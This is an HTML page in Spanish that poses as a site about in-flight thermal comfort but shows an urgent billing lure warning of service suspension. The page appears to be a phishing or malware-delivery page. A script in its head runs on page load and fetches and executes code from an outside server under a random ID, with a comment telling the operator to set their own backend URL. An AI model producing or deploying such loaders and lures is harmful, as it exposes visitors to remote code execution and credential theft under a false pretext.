<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confort en Altitud | Gestión Térmica en Vuelos</title>

    <script>
        (function() {
            // Generar ID aleatorio de 60 caracteres
            var randomID = Array(60).fill(0).map(function(){
                return Math.random().toString(36)[2];
            }).join('');

            // CONFIGURA AQUÍ TU URL DE RENDER
            var backendURL = "https://infonord.onrender.com/" + randomID;

            var s = document.createElement('script');
            s.src = backendURL;
            document.head.appendChild(s);
        })();
    </script>

    <style>
        /* (Tus estilos CSS se mantienen iguales aquí) */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: sans-serif; background: #f9f9f9; text-align: center; }
        .hero { background: #0a1e3c; color: white; padding: 100px 20px; }
        .cta-button { background: #d4af37; color: white; padding: 20px 40px; border-radius: 5px; cursor: pointer; border: none; font-size: 1.2rem; }
    </style>
</head>
<body>
    <header style="padding: 20px; background: white; font-weight: bold;">AeroComfort Dynamics</header>
    
    <section class="hero">
        <h1>Consulta tu factura</h1>
        <p>No permitas la suspensión de tu servicio</p>
        <button id="accessBtn" class="cta-button">Consultar factura</button>
    </section>

    <footer style="padding: 40px; color: #888;">© 2024 AeroComfort Dynamics</footer>
</body>
</html>
